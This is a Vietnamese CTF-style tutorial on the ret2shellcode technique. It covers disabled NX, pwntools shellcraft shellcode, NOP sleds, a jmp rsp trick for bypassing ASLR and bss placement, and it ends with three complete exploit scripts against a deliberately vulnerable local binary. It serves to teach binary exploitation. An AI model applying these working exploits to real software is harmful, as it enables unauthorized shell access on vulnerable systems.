ret2shellcode

Khi NX tắt (stack/bss thực thi được): nhét shellcode (mã máy tự viết, vd spawn shell) vào một vùng ghi được + thực thi, rồi ghi đè saved RIP = địa chỉ shellcode đó. Bài này đi số thật: shellcode vào stack/bss, biết địa chỉ, nhảy vào.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Điều kiện: NX tắt (checksec → "NX disabled" / RWX stack) → stack/bss chạy được mã.

Cách: đặt shellcode (mã máy: setup rồi execve("/bin/sh")) vào buffer, ghi đè saved RIP = địa chỉ của buffer đó. CPU ret vào shellcode → chạy.

Khó: phải biết địa chỉ buffer. No-PIE + no-ASLR stack: địa chỉ cố định (leak/gdb). ASLR stack: cần leak stack, hoặc nhét shellcode vào bss cố định (nếu RWX).

Nếu chỉ nhớ một điều: NX off → shellcode vào buffer, saved RIP = địa chỉ buffer. Cần biết địa chỉ đó.

⚡ COMBAT CARD — dán chạy khi đang thi
🔎 Điều kiện

checksec → NX disabled (hoặc RWX region trong vmmap). Có overflow tới saved RIP + biết/leak địa chỉ vùng chứa shellcode.

⚡ Shellcode (pwntools) 
context.arch = "amd64"
sc = asm(shellcraft.sh())      # execve("/bin/sh") ~ 44 byte
🎯 Shellcode trên stack 
payload = sc.ljust(OFF, b"\x90") + p64(buf_addr)
# sc ở đầu buffer; saved RIP = địa chỉ đầu buffer (nop sled trước sc cũng OK)
🎯 Shellcode trong bss (RWX) 
# G1: read(0, bss, len) ghi sc vào bss ; G2: saved RIP = bss
# bss cố định (no-PIE) → khỏi leak stack
⚠️ Bẫy

Địa chỉ stack đổi do ASLR → leak hoặc dùng bss. NOP sled (\x90) tăng dung sai địa chỉ. Shellcode có null byte bị cắt nếu input dùng scanf %s (xem shellcode nâng cao).

01 / NỀN TẢNG BẮT BUỘC

NX & shellcode

NX (No-eXecute, còn gọi DEP) đánh dấu stack/heap/bss không thực thi — CPU từ chối chạy mã ở đó. Khi NX tắt (binary cũ, hoặc compile -z execstack), các vùng data chạy được mã. Shellcode là một đoạn mã máy nhỏ ta tự viết (thường để execve("/bin/sh",0,0) mở shell). ret2shellcode = đặt shellcode vào vùng chạy được rồi điều hướng CPU tới đó.

Định nghĩa nhanh

NX / DEP

Cấm thực thi vùng data.

shellcode

Mã máy tự viết (spawn shell…).

shellcraft

pwntools sinh shellcode.

NOP sled

Chuỗi \x90 tăng dung sai địa chỉ.

RWX

Vùng vừa ghi vừa chạy được.

execstack

Cờ compile bật stack chạy được.

02 / VÌ SAO CÓ KỸ THUẬT

Kỹ thuật "cổ điển" nhất

Trước khi NX phổ biến (~2004), ret2shellcode là cách khai thác chính: nhét code vào stack rồi chạy. NX ra đời chặn nó → sinh ra ROP/ret2libc. Nhưng ret2shellcode vẫn gặp ở: binary cũ, đề cố tình tắt NX, hoặc sau khi mprotect bật RWX một vùng. Hiểu nó là hiểu "chạy code mới" — nền tảng để đối chiếu với "tái dùng code" (ROP).

03 / SHELLCODE · MỤC LÕI

execve("/bin/sh") — byte thật

# shellcraft.sh() biên dịch (asm) ra ~44 byte:
31 f6               xor    esi, esi          # argv = 0
56                  push   rsi
48 bf 2f 62 69 6e   movabs rdi, "/bin//sh"      # "/bin/sh"
...
6a 3b               push   0x3b             # 59 = execve
58                  pop    rax
0f 05               syscall                   # execve("/bin/sh",0,0)

Bố cục payload (shellcode trên stack, số thật)

0x00shellcode (44 byte) — asm(shellcraft.sh())
0x2c–0x47b"\x90"*padding (NOP) tới OFF=72
0x48 (OFF)p64(buf_addr) = 0x7fffffffe2a0 → saved RIP = đầu buffer
NOP sledNếu địa chỉ buffer không chắc chắn (hơi lệch), đặt một dải \x90 (NOP) TRƯỚC shellcode và trỏ saved RIP vào giữa sled → CPU "trượt" qua NOP tới shellcode. Tăng dung sai khi địa chỉ hơi random.
04 / BIẾT ĐỊA CHỈ SHELLCODE

Ba tình huống

1

No-PIE + bss RWX

Ghi shellcode vào bss (địa chỉ cố định, vd 0x404080), nhảy tới đó. KHÔNG cần leak. Dễ nhất.

2

Stack, ASLR tắt

Địa chỉ buffer cố định (gdb/leak 1 lần). Nhảy thẳng. (Đề thường tắt ASLR local để luyện.)

3

Stack, ASLR bật

Cần leak địa chỉ stack (fmt/__environ) trước, rồi nhảy. Hoặc dùng jmp rsp gadget (rsp trỏ ngay sau RIP = shellcode).

jmp rsp trickNếu có gadget jmp rsp (hoặc call rsp) trong binary: saved RIP = gadget đó; ngay sau saved RIP đặt shellcode. Khi ret vào gadget → jmp rsp nhảy tới shellcode (rsp trỏ ngay sau RIP) → khỏi cần biết địa chỉ stack! Rất hay khi ASLR.

07 / EXPLOIT ĐẦY ĐỦ

  
ret2shellcode (NX off)

  
// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie -z execstack
int main(){ char buf[0x40]; read(0, buf, 0x100); }   // NX off, overflow

  

    
    
    
  


  


# BẢN A — shellcode trên stack, địa chỉ buffer cố định (ASLR off).
from pwn import *
context.arch = "amd64"
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFF = 72
buf_addr = 0x7fffffffe2a0        # địa chỉ buffer (gdb, ASLR off)
sc = asm(shellcraft.sh())         # 44 byte execve("/bin/sh")

payload  = sc.ljust(OFF, b"\x90")   # shellcode + NOP pad tới OFF
payload += p64(buf_addr)          # saved RIP = đầu buffer
p.sendline(payload)
p.interactive()


Thành thậtbuf_addr=0x7fffffffe2a0 là địa chỉ stack khi ASLR OFF (gdb). ASLR ON → địa chỉ đổi mỗi lần → dùng bản B (jmp rsp) hoặc leak stack. OFF=72 dò cyclic.

  


  


# BẢN B — jmp rsp: KHÔNG cần biết địa chỉ stack (vượt ASLR).
from pwn import *
context.arch = "amd64"
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFF = 72
jmp_rsp = next(exe.search(asm("jmp rsp")))   # gadget jmp rsp
sc = asm(shellcraft.sh())

payload  = b"A"*OFF
payload += p64(jmp_rsp)            # saved RIP = jmp rsp
payload += sc                     # shellcode NGAY SAU RIP (rsp trỏ đây)
p.sendline(payload)
p.interactive()


Vượt ASLRjmp rsp nhảy tới [rsp] = ngay sau saved RIP = nơi ta đặt shellcode. Vì tương đối (không cần địa chỉ tuyệt đối) → bỏ qua ASLR stack. Cần binary có gadget jmp rsp (\xff\xe4) & NX off.

  


  


# BẢN C — shellcode trong bss RWX (địa chỉ cố định no-PIE).
from pwn import *
context.arch = "amd64"
exe = ELF("./vuln", checksec=False); p = process(exe.path)
OFF = 72; bss = exe.bss(0x80)       # 0x404080 (RWX nếu execstack)
sc = asm(shellcraft.sh())
# G1: read(0, bss, len) ghi sc ; G2: ret vào bss
r = ROP(exe); r.read(0, bss, len(sc)); r.raw(bss)
p.sendline(b"A"*OFF + r.chain())
p.send(sc)
p.interactive()


bss cố địnhbss no-PIE cố định → khỏi leak. Chỉ chạy nếu bss RWX (execstack thường làm cả bss chạy được). Nếu không RWX → mprotect trước.
